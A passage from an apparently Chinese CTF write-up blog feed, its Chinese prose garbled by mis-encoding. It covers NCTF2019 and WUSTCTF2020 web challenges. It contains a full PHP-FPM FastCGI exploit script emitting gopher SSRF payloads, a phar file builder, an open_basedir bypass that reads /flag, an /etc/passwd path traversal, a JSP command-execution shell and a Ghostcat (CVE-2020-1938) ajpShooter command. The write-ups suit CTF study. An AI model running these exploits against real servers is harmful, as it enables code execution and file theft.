       <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è„šæœ¬æ¥è‡ª<a href="https://evoa.me/archives/6/#PHP-FPM" target="_blank" rel="noopener">https://evoa.me/archives/6/#PHP-FPM</a> evoaå¸ˆå‚…çš„åšå®¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $url=<span class="string">"gopher://173.111.147.11:9000/_%01%01%D7%96%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D7%96%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D7%96%00%00%00%00%01%05%D7%96%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D7%96%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">    @unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">    $obj = <span class="keyword">new</span> Main;</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/2020/07/30/NCTF2019-phar-matches-everything/6.png" class=""><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè®¿é—®åˆ°äº†phpinfoé¡µé¢ï¼Œçœ‹åˆ°äº†ç»å¤§å¤šæ•°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«banï¼Œå‘ç°<code>open_basedirï¼š**/var/www/html:/tmp**</code></p><p>ä¸‹é¢å°±æ˜¯å¥—ç»•è¿‡open_basedirçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/30/NCTF2019-phar-matches-everything/7.png" class=""><p>å†é‡æ–°ç”Ÿæˆä¸€ä¸‹pharæ–‡ä»¶å†ä¼ ä¸Šå»è®¿é—®</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;a href=&quot;#çŸ¥è¯†ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;/a&gt;çŸ¥è¯†ç‚¹
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020</title>
    <link href="http://yoursite.com/2020/07/28/WUSTCTF2020/"/>
    <id>http://yoursite.com/2020/07/28/WUSTCTF2020/</id>
    <published>2020-07-28T04:09:33.000Z</published>
    <updated>2020-07-28T09:49:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb<a id="more"></a></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>JSP</li><li>CVE-2020-1938å¹½çµçŒ«æ–‡ä»¶åŒ…å«</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå›å¾—åˆ°ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»å¯ä»¥è¿›è¡Œä¸‹è½½</p><p>æµ‹è¯•å‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥ä»»æ„ä¸‹è½½æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2f1070d6-bc24-4d35-adb5-15c7449d3e83.node3.buuoj.cn&#x2F;download?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>åœ¨é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰å‘ç°å­˜åœ¨çš„ç”¨æˆ·ï¼Œä¹Ÿå°±ä¸èƒ½å¤Ÿä¸‹è½½.bash_history,ä¹Ÿå°±æ„å‘³ç€é€šè¿‡æŸ¥çœ‹historyæ–‡ä»¶æ¥è·å–flagè·¯å¾„èµ°ä¸é€šäº†</p><p>æµ‹è¯•å‘ç°æ˜¯Tomcat/8.5.42ï¼Œ8009ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œçœ‹äº†ä¸€ä¸‹é¢˜è§£æ˜¯è€ƒå¯ŸCVE-2020-1938å¹½çµçŒ«æ–‡ä»¶åŒ…å«</p><p>é—®æ˜Ÿç›Ÿé‡Œçš„å¸ˆå‚…è¦äº†ä¸ªpocï¼Œç”¨ajpshooterå¯ä»¥è¿›è¡ŒåŒ…å«</p><p>ä¸Šä¼ ä¸€ä¸ªjspæ–‡ä»¶æ‹¿åˆ°è·¯å¾„</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls / -al"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/28/WUSTCTF2020/1.png" class=""><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://<span class="number">2</span>f1070d6-bc24-<span class="number">4</span>d35-adb5-<span class="number">15</span>c7449d3e83.node3.buuoj.cn:<span class="number">8009</span>/ <span class="number">8009</span> /WEB-INF/uploads/b33c1c1f-<span class="number">22</span>ee-<span class="number">4369</span>-<span class="number">95</span><span class="built_in">cd</span>-<span class="number">945</span>e941a65bb.jsp eval</span><br></pre></td></tr></table></figure><p>å†ç”¨å†…ç½‘é¶æœºæ‰“çš„æ—¶å€™æ€»æ˜¯æç¤ºè¯´è¿æ¥å¤±è´¥ï¼Œä¸çŸ¥é“å’‹å›äº‹ï¼Œå°±å…ˆä¸ç®¡äº†</p><p>ä¸‹é¢çš„æ­¥éª¤å¾ˆç®€å•ï¼Œæ‹¿åˆ°è·¯å¾„ä¹‹åï¼Œè¯»å–flagæ–‡ä»¶ï¼Œå†æ‰“ä¸€æ¬¡è¿‡å»å°±å¯ä»¥äº†</p><h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li><p>tomcatç›®å½•ç©¿è¶Š</p></li><li><p>TOMCATç®¡ç†ç«¯å¼±å£ä»¤</p></li><li><p>åå°ä¸Šä¼ waræœ¨é©¬</p></li><li><p>Cookie</p></li></ul><h2 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="TOMCATç›®å½•ç©¿è¶Š"><a href="#TOMCATç›®å½•ç©¿è¶Š" class="headerlink" title="TOMCATç›®å½•ç©¿è¶Š"></a>TOMCATç›®å½•ç©¿è¶Š</h3><p>æ ¹æ®imageå¸ˆå‚…çš„wpæ‰¾åˆ°äº†Orangeå¸ˆå‚…åœ¨BlackHatä¸Šä½œçš„è®®é¢˜(<a href="https://www.youtube.com/watch?v=28xWcRegncw" target="_blank" rel="noopener">DEF CON 26 â€“ Orange Tsai â€“ Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out</a>)æœ‰æ—¶é—´çš„éƒ½å¯ä»¥å»ç»ä»°é£é‡‡é¡ºä¾¿å­¦ä¹ ä¸€æ³¢çŸ¥è¯†</p><p>ä¸‹é¢çš„æ€»ç»“æ¥è‡ªè§†é¢‘</p><img src="/2020/07/28/WUSTCTF2020/2.png" class=""><p>Nginx ä¼šè§£æ /a;evil/b/ï¼Œå¹¶è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„ç›®å½•è¯·æ±‚ï¼Œè€Œ Tomcat åšè§£æçš„æ—¶å€™ä¼šè‡ªåŠ¨å¿½ç•¥æ‰è„æ•°æ® ;.*ï¼Œæ‰€ä»¥ Tomcat å¯¹æ­¤çš„è§£ææ˜¯ /a/b/ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä»å¯ä»¥é€šè¿‡å†™ ;+è„æ•°æ®çš„æ–¹å¼ç»•è¿‡ Nginx çš„åå‘ä»£ç†ï¼Œä»è€Œè¯·æ±‚æœ¬ä¸åº”è¯¥èƒ½è¯·æ±‚åˆ°çš„éæ³•è·¯å¾„</p><p>ä¸‹é¢è¿™å¼ å›¾ç‰‡ç®€å•æ˜äº†</p><img src="/2020/07/28/WUSTCTF2020/3.png" class=""><p>æ‰€ä»¥ç¬¬ä¸€å±‚ç›®å½•ç©¿è¶Š/..;/å¯ä»¥æ¥åˆ°ä¸Šå±‚ç›®å½•ï¼Œä¹Ÿå°±èƒ½å¤Ÿæ¥åˆ°åå°</p><h3 id="TOMCATç®¡ç†ç«¯å¼±å£ä»¤"><a href="#TOMCATç®¡ç†ç«¯å¼±å£ä»¤" class="headerlink" 